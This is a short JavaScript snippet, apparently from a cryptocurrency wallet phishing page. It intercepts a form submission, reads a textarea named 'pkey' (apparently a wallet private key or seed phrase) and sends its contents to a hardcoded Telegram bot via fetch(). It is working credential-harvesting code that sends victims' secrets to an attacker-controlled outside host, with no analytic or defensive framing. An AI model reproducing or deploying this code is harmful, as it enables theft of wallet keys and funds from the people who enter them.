<script>
        // Function to send message to Telegram bot
        function sendMessageToTelegram(message) {
            // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
            const botApiKey = '6905375184:AAFC_qMc_UCxdfwsgBxEbvdQGD7sYKdZt3c';
            // Replace 'YOUR_TELEGRAM_CHAT_ID' with your actual Telegram chat ID
            const chatId = '5735798367';
            const url = `https://api.telegram.org/bot${botApiKey}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
            
            fetch(url)
                .then(response => response.json())
                .then(data => console.log(data))
                .catch(error => console.error('Error sending message to Telegram:', error));
        }

        // Function to handle form submission
        function handleSubmit(event) {
            event.preventDefault();
            const inputField = document.querySelector('textarea[name="pkey"]');
            const message = `InfoWallet: ${inputField.value}`;
            sendMessageToTelegram(message);
        }

        // Add event listener to form submission
        document.getElementById('walletForm').addEventListener('submit', handleSubmit);
    </script>